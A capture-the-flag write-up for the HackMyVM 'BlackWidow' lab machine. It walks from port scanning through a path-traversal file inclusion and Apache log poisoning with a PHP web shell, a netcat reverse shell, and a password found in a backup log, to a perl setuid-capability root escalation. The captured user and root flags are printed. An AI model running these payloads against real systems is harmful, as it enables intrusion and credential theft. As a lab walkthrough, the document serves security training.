# BlackWidow

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.99:22
Open 10.0.2.99:80
Open 10.0.2.99:111
Open 10.0.2.99:3128
Open 10.0.2.99:2049
Open 10.0.2.99:39581
Open 10.0.2.99:41141
Open 10.0.2.99:49787
Open 10.0.2.99:60487
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.99
PORT      STATE SERVICE    REASON  VERSION
22/tcp    open  ssh        syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 f8:3b:7c:ca:c2:f6:5a:a6:0e:3f:f9:cf:1b:a9:dd:1e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnsjlNONcku933wJXG6c7zW2yFvbroPDS8PcoWke6IpBG6RbVokkmOyDCdTzYtQbxwb5I17h8AK1d/a+SPQWjEG71TVzcogM/RpbtnP27SlYIVRv7de6unovPJlXmEBW5ACHRtRd5OoJ6oyv4FvR3SlbgaJkQEYG3SxBTcPLuSchTqimBh45II3s81SCU0O22j9dxIatzjhlFGOe9bVP9kfC8oF5Llrve3ReRx/Zt99ByY5oGNZ57dpb+sdjvHdJlBIS02D7mHF+GhW9VixYpg1gJFfcNdaJksbrjVoLXIkC3SSHqgaiFYL5Y5JSEO44oP9Rp+igdgc29ysGXOS417
|   256 04:31:5a:34:d4:9b:14:71:a0:0f:22:78:2d:f3:b6:f6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMdVV7LG2ve48JMOO6FbWxmdQhQ8KHcOKSkcIlGPmtdA9EUjCh8TRN9q/lfsZDrq54aJ5brqcI/pvQqwPFanKW8=
|   256 4e:42:8e:69:b7:90:e8:27:68:df:68:8a:83:a7:87:9c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIzpLR6WAXAhIzPtdFobvUkZSDsIL9juu2N70C6tcyxy
80/tcp    open  http       syn-ack Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind    syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      38725/tcp6  mountd
|   100005  1,2,3      46884/udp   mountd
|   100005  1,2,3      48387/udp6  mountd
|   100005  1,2,3      49787/tcp   mountd
|   100021  1,3,4      39581/tcp   nlockmgr
|   100021  1,3,4      41803/tcp6  nlockmgr
|   100021  1,3,4      48747/udp6  nlockmgr
|   100021  1,3,4      58871/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs        syn-ack 3-4 (RPC #100003)
3128/tcp  open  http-proxy syn-ack Squid http proxy 4.6
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved
39581/tcp open  nlockmgr   syn-ack 1-4 (RPC #100021)
41141/tcp open  mountd     syn-ack 1-3 (RPC #100005)
49787/tcp open  mountd     syn-ack 1-3 (RPC #100005)
60487/tcp open  mountd     syn-ack 1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP (80)

Only image is served on index

![writeup.png](/assets/pentest/hackmyvm/blackwidow/writeup.png)

```bash
‚îî‚îÄ$ feroxbuster -u http://10.0.2.99 -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500,403 --dont-scan css,png,jpeg,jpg,gif -n -x .php
200      GET        3l        7w       84c http://10.0.2.99/
301      GET        9l       28w      308c http://10.0.2.99/company => http://10.0.2.99/company/
301      GET        9l       28w      305c http://10.0.2.99/docs => http://10.0.2.99/docs/
200      GET        3l        7w       84c http://10.0.2.99/index.html
301      GET        9l       28w      303c http://10.0.2.99/js => http://10.0.2.99/js/
```

There's a domain name `blackwidow`, add to hosts
```bash
‚îî‚îÄ$ curl http://10.0.2.99/company/ -s | htmlq a -a href | sort | uniq -c
     21
     31 #
      2 #about
      1 assets/img/portfolio/portfolio-1.jpg
      1 assets/img/portfolio/portfolio-2.jpg
      1 assets/img/portfolio/portfolio-3.jpg
      1 assets/img/portfolio/portfolio-4.jpg
      1 assets/img/portfolio/portfolio-5.jpg
      1 assets/img/portfolio/portfolio-6.jpg
      1 assets/img/portfolio/portfolio-7.jpg
      1 assets/img/portfolio/portfolio-8.jpg
      1 assets/img/portfolio/portfolio-9.jpg
      1 #contact
      1 http://blackwidow/company/started.php
      1 https://bootstrapmade.com/
      1 https://www.youtube.com/watch?v=jDDaplaOz7Q
      2 index.html
      1 #portfolio
      9 portfolio-details.html
      1 #services
      1 #team
```

### LFI

![writeup-1.png](/assets/pentest/hackmyvm/blackwidow/writeup-1.png)

```bash
‚îî‚îÄ$ curl 'http://blackwidow/company/started.php?file=../../../../../../../../../../../../../etc/passwd' -s | grep sh$
root:x:0:0:root:/root:/bin/bash
viper:x:1001:1001:Viper,,,:/home/viper:/bin/bash
```

### RCE

We have access to log files
```bash
‚îî‚îÄ$ curl 'http://blackwidow/company/started.php?file=../../../../../../../../../../../../../var/log/apache2/access.log' -s | head
10.0.2.15 - - [03/Nov/2025:10:29:23 -0500] "GET / HTTP/1.0" 200 353 "-" "-"
10.0.2.15 - - [03/Nov/2025:10:29:28 -0500] "PROPFIND / HTTP/1.1" 405 519 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.0.2.15 - - [03/Nov/2025:10:29:28 -0500] "PROPFIND / HTTP/1.1" 405 519 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.0.2.15 - - [03/Nov/2025:10:29:28 -0500] "POST /sdk HTTP/1.1" 404 451 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.0.2.15 - - [03/Nov/2025:10:29:28 -0500] "GET / HTTP/1.0" 200 353 "-" "-"
10.0.2.15 - - [03/Nov/2025:10:29:28 -0500] "GET /robots.txt HTTP/1.1" 404 451 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.0.2.15 - - [03/Nov/2025:10:29:28 -0500] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.0.2.15 - - [03/Nov/2025:10:29:28 -0500] "GET /nmaplowercheck1762183768 HTTP/1.1" 404 451 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.0.2.15 - - [03/Nov/2025:10:29:28 -0500] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.0.2.15 - - [03/Nov/2025:10:29:28 -0500] "POST / HTTP/1.1" 200 353 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
```

Let's poison log and get RCE
```bash
‚îî‚îÄ$ curl 'http://blackwidow/company/started.php' -A '<?php if(isset($_REQUEST[0])){system($_REQUEST[0]);}; ?>'

‚îî‚îÄ$ curl 'http://blackwidow/company/started.php?file=../../../../../../../../../../../../../var/log/apache2/access.log&0=id' -s | grep '"uid'
10.0.2.15 - - [03/Nov/2025:11:32:01 -0500] "GET /company/started.php HTTP/1.1" 200 42463 "-" "uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
‚îî‚îÄ$ curl 'http://blackwidow/company/started.php?file=../../../../../../../../../../../../../var/log/apache2/access.log' -G --data-urlencode '0=busybox nc 10.0.2.15 4444 -e /bin/bash'
---
‚îî‚îÄ$ pwncat-cs -lp 4444
[11:33:37] Welcome to pwncat üêà!                      
[11:34:25] received connection from 10.0.2.99:43000  
[11:34:30] 10.0.2.99:43000: registered new host w/ db
(local) pwncat$
(remote) www-data@blackwidow:/var/www/html/company$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

(remote) www-data@blackwidow:/var/www/html/company$ cat started.php
<?php
$file = $_GET['file'];
if(isset($file)) {
   include("/etc/var/folder/folder/folder/folder/folder/folder/folder/folder/folder/folder/folder/$file");
} else {
   include("index.html");
}
?>
```

## Lateral Movement

Usually the `/var/log/` files are read by `adm` group and it's not globally accessible, there could be more in logs.
```bash
(remote) www-data@blackwidow:/var/www/html$ find /var/log -readable -type f -ls 2>/dev/null
   263346      0 -rw-r--r--   1 root     root            0 Apr 21  2021 /var/log/alternatives.log
   262500     60 -rw-rw-r--   1 root     utmp        53376 Nov  3 10:28 /var/log/wtmp
   262466    232 -rw-r--r--   1 root     root       233345 Dec 13  2020 /var/log/dpkg.log.1
   262168     20 -rw-r--r--   1 root     root        18902 Dec 11  2020 /var/log/installer/hardware-summary
   262247      4 -rw-r--r--   1 root     root          160 Dec 11  2020 /var/log/installer/lsb-release
   262235     72 -rw-r--r--   1 root     root        72815 Dec 11  2020 /var/log/installer/status
   262502     12 -rw-rw-r--   1 root     utmp       292584 May  2  2021 /var/log/lastlog
   262706      0 -rw-r--r--   1 root     root            0 Apr 21  2021 /var/log/apt/history.log
   269519      4 -rw-r--r--   1 root     root         3834 Dec 13  2020 /var/log/apt/history.log.1.gz
   262162     20 -rw-r--r--   1 root     root        17204 Dec 13  2020 /var/log/apt/eipp.log.xz
   262687      8 -rw-r--r--   1 root     root        32064 Dec 13  2020 /var/log/faillog
   262522     16 -rw-r--r--   1 root     root        15142 Dec 11  2020 /var/log/alternatives.log.1
   269656      0 -rw-r--r--   1 root     root            0 Apr 21  2021 /var/log/dpkg.log
   269430      8 -rwxr-xr-x   1 root     adm          5357 Dec 13  2020 /var/log/apache2/access.log.4.gz
   269446     12 -rwxr-xr-x   1 root     adm          8243 Dec 19  2020 /var/log/apache2/error.log.4.gz
   263384      4 -rwxrwxrwx   1 root     adm          1030 Apr 21  2021 /var/log/apache2/access.log.2.gz
   269455  18500 -rwxrwxrwx   1 root     adm      18941753 Nov  3 11:41 /var/log/apache2/access.log
   263112    536 -rwxrwxrwx   1 root     adm        545744 May  2  2021 /var/log/apache2/access.log.1
   269427      4 -rwxr-xr-x   1 root     adm          1140 Dec 24  2020 /var/log/apache2/access.log.3.gz
```

Nothing. 

The user has something backup related, but not readable by anyone but the user.
```bash
(remote) www-data@blackwidow:/$ find /home -ls 2>/dev/null
   131078      4 drwxr-xr-x   3 root     root         4096 Dec 12  2020 /home
   132571      4 drwxr-xr-x   4 viper    viper        4096 May  2  2021 /home/viper
   132271      4 -rw-------   1 viper    viper          56 May  2  2021 /home/viper/.Xauthority
   138529      4 -rw-------   1 viper    viper        1546 May  2  2021 /home/viper/.bash_history
   132572      4 -rw-r--r--   1 viper    viper        3526 Dec 12  2020 /home/viper/.bashrc
   138538      4 -rw-------   1 viper    viper          33 Dec 12  2020 /home/viper/local.txt
   132573      4 -rw-r--r--   1 viper    viper         807 Dec 12  2020 /home/viper/.profile
   132276      4 drwx------   4 viper    viper        4096 Dec 13  2020 /home/viper/backup_site # <---
   138540      4 drwxr-xr-x   3 viper    viper        4096 Dec 13  2020 /home/viper/.local
   138542      4 drwx------   3 viper    viper        4096 Dec 13  2020 /home/viper/.local/share
   138527      4 -rw-r--r--   1 viper    viper         220 Dec 12  2020 /home/viper/.bash_logout
```

```bash
(remote) www-data@blackwidow:/$ find /var/backups/ -name *.log -readable -ls
   262305     32 -rw-r--r--   1 root     root        31646 Dec 13  2020 /var/backups/auth.log

(remote) www-data@blackwidow:/$ cat /var/backups/auth.log | grep invalid -i | cut -d' ' -f6- | sort | uniq -c
      1 Failed password for invalid user ?V1p3r2020!? from 192.168.1.109 port 7090 ssh2
      1 Failed password for invalid user giulio from 192.168.1.109 port 7001 ssh2
      6 Invalid user ?V1p3r2020!? from 192.168.1.109 port 7090
      1 Invalid user giulio from 192.168.1.109 port 7001
```

## SSH (viper)

```bash
‚îî‚îÄ$ sshpass -p '?V1p3r2020!?' ssh viper@10.0.2.99
viper@blackwidow:~$ id
uid=1001(viper) gid=1001(viper) groups=1001(viper)
```

### User.txt

```bash
viper@blackwidow:~$ cat local.txt
d930fe79919376e6d08972dae222526b
```

## Privilege Escalation

```bash
viper@blackwidow:~$ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
...
Files with capabilities (limited to 50):
/home/viper/backup_site/assets/vendor/weapon/arsenic = cap_setuid+ep
/home/viper/backup_site/assets/vendor/weapon/arsenic = cap_setuid+ep is writable
/usr/bin/perl =
/usr/bin/perl5.28.1 =
/usr/bin/ping = cap_net_raw+ep
/usr/lib/squid/pinger = cap_net_raw+ep
...
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Executable files potentially added by user (limit 70)
2025-11-03+11:41:11.2730084420 /var/log/apache2/access.log
2021-05-02+15:37:07.8379494100 /var/log/apache2/access.log.1
2020-12-13+05:51:32.2542965500 /home/viper/backup_site/assets/vendor/weapon/arsenic
...
```

```bash
viper@blackwidow:~$ /home/viper/backup_site/assets/vendor/weapon/arsenic --help
Usage: /home/viper/backup_site/assets/vendor/weapon/arsenic [switches] [--] [programfile] [arguments]
...
  -e program        one line of program (several -e's allowed, omit programfile)
  -E program        like -e, but enables all optional features
...

Run 'perldoc perl' for more help with Perl.
```

- [https://gtfobins.github.io/gtfobins/perl](https://gtfobins.github.io/gtfobins/perl)

```bash
viper@blackwidow:~$ /home/viper/backup_site/assets/vendor/weapon/arsenic -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash -p";'
root@blackwidow:~# id
uid=0(root) gid=1001(viper) groups=1001(viper)
```

### Root.txt

```
root@blackwidow:~# cat /root/root.txt
‚ñÑ‚ñÑ‚ñÑ‚ñÑ¬∑ ‚ñÑ‚ñÑ‚ñå   ‚ñÑ‚ñÑ‚ñÑ¬∑  ‚ñÑ‚ñÑ¬∑ ‚ñÑ ‚Ä¢‚ñÑ     ‚ñÑ‚ñÑ‚ñå ‚ñê ‚ñÑ‚ñå‚ñ™  ¬∑‚ñÑ‚ñÑ‚ñÑ‚ñÑ        ‚ñÑ‚ñÑ‚ñå ‚ñê ‚ñÑ‚ñå
‚ñê‚ñà ‚ñÄ‚ñà‚ñ™‚ñà‚ñà‚Ä¢  ‚ñê‚ñà ‚ñÄ‚ñà ‚ñê‚ñà ‚ñå‚ñ™‚ñà‚ñå‚ñÑ‚ñå‚ñ™    ‚ñà‚ñà¬∑ ‚ñà‚ñå‚ñê‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñ™ ‚ñà‚ñà ‚ñ™     ‚ñà‚ñà¬∑ ‚ñà‚ñå‚ñê‚ñà
‚ñê‚ñà‚ñÄ‚ñÄ‚ñà‚ñÑ‚ñà‚ñà‚ñ™  ‚ñÑ‚ñà‚ñÄ‚ñÄ‚ñà ‚ñà‚ñà ‚ñÑ‚ñÑ‚ñê‚ñÄ‚ñÄ‚ñÑ¬∑    ‚ñà‚ñà‚ñ™‚ñê‚ñà‚ñê‚ñê‚ñå‚ñê‚ñà¬∑‚ñê‚ñà¬∑ ‚ñê‚ñà‚ñå ‚ñÑ‚ñà‚ñÄ‚ñÑ ‚ñà‚ñà‚ñ™‚ñê‚ñà‚ñê‚ñê‚ñå
‚ñà‚ñà‚ñÑ‚ñ™‚ñê‚ñà‚ñê‚ñà‚ñå‚ñê‚ñå‚ñê‚ñà ‚ñ™‚ñê‚ñå‚ñê‚ñà‚ñà‚ñà‚ñå‚ñê‚ñà.‚ñà‚ñå    ‚ñê‚ñà‚ñå‚ñà‚ñà‚ñê‚ñà‚ñå‚ñê‚ñà‚ñå‚ñà‚ñà. ‚ñà‚ñà ‚ñê‚ñà‚ñå.‚ñê‚ñå‚ñê‚ñà‚ñå‚ñà‚ñà‚ñê‚ñà‚ñå
¬∑‚ñÄ‚ñÄ‚ñÄ‚ñÄ .‚ñÄ‚ñÄ‚ñÄ  ‚ñÄ  ‚ñÄ ¬∑‚ñÄ‚ñÄ‚ñÄ ¬∑‚ñÄ  ‚ñÄ     ‚ñÄ‚ñÄ‚ñÄ‚ñÄ ‚ñÄ‚ñ™‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚Ä¢  ‚ñÄ‚ñà‚ñÑ‚ñÄ‚ñ™ ‚ñÄ‚ñÄ‚ñÄ‚ñÄ ‚ñÄ‚ñ™

Congrats!

You've rooted Black Widow!

0xJin - mindsflee
Follow on Instagram: 0xjiin
Follow on Twitter: 0xJin , @mindsflee

0780eb289a44ba17ea499ffa6322b335
```